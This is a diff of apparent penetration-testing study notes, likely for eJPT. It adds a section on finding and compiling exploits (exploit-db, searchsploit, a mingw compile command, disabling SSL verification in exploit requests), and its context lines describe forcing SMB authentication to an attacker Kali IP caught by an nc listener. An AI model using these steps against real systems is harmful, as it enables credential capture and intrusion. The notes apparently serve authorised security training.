@@ -198,8 +198,16 @@ use the following website for the rainbow table attack
 - thirdly, using cmd that is connected to the target machine, send smb authentication
 -     dir \\<Kali_IP>\test
 - fourthly, you will receive a connection on the nc listener
-- 
-
+ 
+-----------------------------------------------------------------Searching for Ecploits-------------------------------------------------------------------------
+- https://www.exploit-db.com/
+- searchsploit
+- nmap scripting engine
+- metasploit
+- compiling exploits on windows
+-     i686-w64-mingw32-gcc <42341.c> -o <exploit.exe> -lws2_32
+- assuming that the website has an SSL certificate on the browser. you need to fix the exploit by adding 'verify=False' in the post request.
+-     response = requests.post(url, data=data, allow_redirects=False, verify=False)
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Platforms
 1. for Initial Access work on eJPT, This article and official content 
